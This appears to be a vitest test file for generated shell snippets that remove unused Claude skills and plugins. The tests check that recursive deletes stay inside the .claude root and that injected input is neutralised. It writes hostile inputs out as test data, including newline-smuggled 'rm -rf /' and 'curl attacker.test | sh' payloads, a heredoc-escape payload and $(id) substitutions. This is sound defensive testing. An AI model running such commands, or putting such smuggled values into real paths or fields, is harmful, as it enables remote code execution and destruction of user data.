/**
 * #3117 — the generated remediation for an unused skill/plugin is a recursive
 * delete. `shellQuote` stops injection, but a quoted dangerous path just gets
 * deleted accurately, so the SCOPE has to be bounded as well as the syntax.
 * A malformed or poisoned config supplying `/`, `$HOME`, or the Claude config
 * root would otherwise produce a copy-pasteable `rm -rf` of it.
 */
import { describe, it, expect } from 'vitest';
import { buildConfigRemovalSnippet, buildConfigOpenCommand } from './config-hygiene-actions';
import type { HygieneFinding } from './config-hygiene';

function finding(over: Partial<HygieneFinding>): HygieneFinding {
  return {
    resourceType: 'skill',
    resourceId: 'some-skill',
    scope: { kind: 'global' },
    removalPath: '/home/me/.claude/skills/some-skill',
    ...over,
  } as HygieneFinding;
}

describe('buildConfigRemovalSnippet recursive-delete containment (#3117)', () => {
  const DANGEROUS = [
    ['filesystem root', '/'],
    ['home directory', '/home/me'],
    ['tilde home', '~'],
    ['claude config root', '/home/me/.claude'],
    ['skills root itself', '/home/me/.claude/skills'],
    ['trailing-slash skills root', '/home/me/.claude/skills/'],
    ['traversal out of the root', '/home/me/.claude/skills/../../..'],
    ['traversal to a sibling', '/home/me/.claude/skills/x/../../../secrets'],
    ['out-of-root path', '/etc'],
    ['relative out-of-root path', 'some/other/dir'],
    // A segment merely NAMED `skills`/`plugins` is not containment: these must
    // be anchored under a real .claude root, or a poisoned registry pointing at
    // /tmp still earns an rm -rf.
    ['decoy root outside .claude', '/tmp/skills/victim'],
    ['relative decoy root', 'skills/victim'],
    ['claude-adjacent but wrong root', '/home/me/.claude/other/victim'],
    // Backslashes are literal filename characters on POSIX, so a path that
    // only LOOKS nested once they are treated as separators must not be
    // approved -- the emitted command would delete the out-of-root directory
    // that actually has backslashes in its name.
    ['backslash separators outside the root', '/tmp/.claude\\plugins\\victim'],
    ['backslash separators mimicking a real root', '/home/me/.claude\\skills\\victim'],
    ['mixed separators', '/home/me/.claude/skills\\..\\..\\victim'],
  ] as const;

  it.each(DANGEROUS)('never emits rm -rf for the %s', (_label, removalPath) => {
    const snippet = buildConfigRemovalSnippet(
      finding({ resourceType: 'skill', removalPath })
    );

    expect(snippet).not.toContain('rm -rf');
    // The fallback must be inert: a comment the user reads, not a command.
    expect(snippet.startsWith('#')).toBe(true);
  });

  it('never emits rm -rf for an out-of-root plugin install path', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({
        resourceType: 'plugin',
        resourceId: 'rogue',
        removalPath: '/home/me/Documents',
      })
    );

    expect(snippet).not.toContain('rm -rf');
    expect(snippet.startsWith('#')).toBe(true);
  });

  it('still emits a quoted rm -rf for a valid nested skill path', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({ removalPath: '/home/me/.claude/skills/some-skill' })
    );

    expect(snippet).toBe("rm -rf -- '/home/me/.claude/skills/some-skill'");
  });

  it('still emits a quoted rm -rf for a valid nested plugin path', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({
        resourceType: 'plugin',
        resourceId: 'pack',
        removalPath: '/home/me/.claude/plugins/pack',
      })
    );

    expect(snippet).toContain("rm -rf -- '/home/me/.claude/plugins/pack'");
  });

  it('accepts a deeply nested resource below its root', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({ removalPath: '/home/me/proj/.claude/skills/group/nested-skill' })
    );

    expect(snippet).toContain('rm -rf --');
  });

  it('keeps quoting a valid path that contains shell metacharacters', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({ removalPath: "/home/me/.claude/skills/we'ird; rm -rf /" })
    );

    // Bounded, so it is still emitted -- but single-quote-escaped, so the
    // embedded command cannot execute.
    expect(snippet).toContain('rm -rf --');
    expect(snippet).toContain(`'/home/me/.claude/skills/we'\\''ird; rm -rf /'`);
  });

  it('leaves non-recursive single-file removals unchanged', () => {
    expect(
      buildConfigRemovalSnippet(
        finding({
          resourceType: 'command',
          resourceId: 'cmd',
          removalPath: '/home/me/.claude/commands/cmd.md',
        })
      )
    ).toBe("rm -- '/home/me/.claude/commands/cmd.md'");
  });
});

/**
 * The fallback is emitted into shell snippets, so untrusted values reaching it
 * must not be able to break out of the comment they sit in.
 */
describe('manual fallback is inert against poisoned values (#3117)', () => {
  it('never lets a newline in the path escape the comment', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({ removalPath: '/tmp/evil\nrm -rf /\n#' })
    );

    // The payload survives as inert TEXT, flattened onto the single commented
    // line -- what must not happen is it gaining a line of its own.
    expect(snippet).not.toMatch(/^\s*rm -rf/m);
    for (const line of snippet.split('\n')) {
      expect(line.trimStart().startsWith('#')).toBe(true);
    }
  });

  it('never lets a newline in the resource id escape the comment', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({ resourceId: 'evil\ncurl attacker.test | sh\n#', removalPath: '/etc' })
    );

    expect(snippet).not.toMatch(/^\s*curl attacker\.test/m);
    for (const line of snippet.split('\n')) {
      expect(line.trimStart().startsWith('#')).toBe(true);
    }
  });

  it('does not leave a dangling && when a plugin path fails validation', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({
        resourceType: 'plugin',
        resourceId: 'rogue',
        sourcePath: '/home/me/.claude/installed_plugins.json',
        removalPath: '/home/me/Documents',
      })
    );

    // The heredoc that removes the registry entry must still be intact and
    // syntactically complete -- the note goes on its own line after it.
    expect(snippet).toContain("node <<'NODE'\n");
    expect(snippet).not.toContain("&& #");
    expect(snippet).not.toMatch(/&&\s*$/m);
    expect(snippet).toContain('NODE\n# Refusing');
  });

  it('still chains a valid plugin delete after the registry edit', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({
        resourceType: 'plugin',
        resourceId: 'pack',
        sourcePath: '/home/me/.claude/installed_plugins.json',
        removalPath: '/home/me/.claude/plugins/pack',
      })
    );

    expect(snippet).toContain("node <<'NODE' && rm -rf -- '/home/me/.claude/plugins/pack'");
  });

  it('cannot be used to close the heredoc early', () => {
    const snippet = buildConfigRemovalSnippet(
      finding({
        resourceType: 'plugin',
        resourceId: 'p',
        sourcePath: '/home/me/.claude/installed_plugins.json',
        removalPath: '/tmp/x\nNODE\ncurl attacker.test | sh\n#',
      })
    );

    // Exactly one NODE terminator, and no injected command on its own line.
    expect(snippet.split('\n').filter((l) => l === 'NODE')).toHaveLength(1);
    expect(snippet).not.toMatch(/^curl attacker\.test/m);
  });
});

/**
 * The "open config file" affordance is copy-pasted into a shell too, so the
 * same rule applies to it as to the removal snippets: a path out of a poisoned
 * config must not be able to execute. It previously double-quoted `~` paths,
 * which expands $HOME as intended but leaves $(...), backticks and $VAR live.
 */
describe('buildConfigOpenCommand quoting', () => {
  it('does not leave command substitution live in a tilde path', () => {
    const cmd = buildConfigOpenCommand(
      finding({ sourcePath: '~/.claude/skills/$(id)/SKILL.md' })
    );

    expect(cmd).not.toContain('"~/.claude/skills/$(id)/SKILL.md"');
    // $HOME still expands; everything after it is inert.
    expect(cmd).toContain('"$HOME"');
    expect(cmd).toContain("'/.claude/skills/$(id)/SKILL.md'");
  });

  it('does not leave backticks live in a tilde path', () => {
    const cmd = buildConfigOpenCommand(
      finding({ sourcePath: '~/.claude/skills/`id`/SKILL.md' })
    );

    expect(cmd).toContain('"$HOME"');
    expect(cmd).toContain("'/.claude/skills/`id`/SKILL.md'");
  });

  it('still single-quotes an absolute path', () => {
    expect(
      buildConfigOpenCommand(finding({ sourcePath: '/home/me/.claude/skills/s/SKILL.md' }))
    ).toBe("code -g '/home/me/.claude/skills/s/SKILL.md'");
  });

  it('escapes an embedded single quote in a tilde path', () => {
    const cmd = buildConfigOpenCommand(finding({ sourcePath: "~/.claude/skills/we'ird/S.md" }));
    expect(cmd).toContain(`'/.claude/skills/we'\\''ird/S.md'`);
  });

  it('handles a bare tilde', () => {
    expect(buildConfigOpenCommand(finding({ sourcePath: '~' }))).toBe('code -g "$HOME"');
  });
});
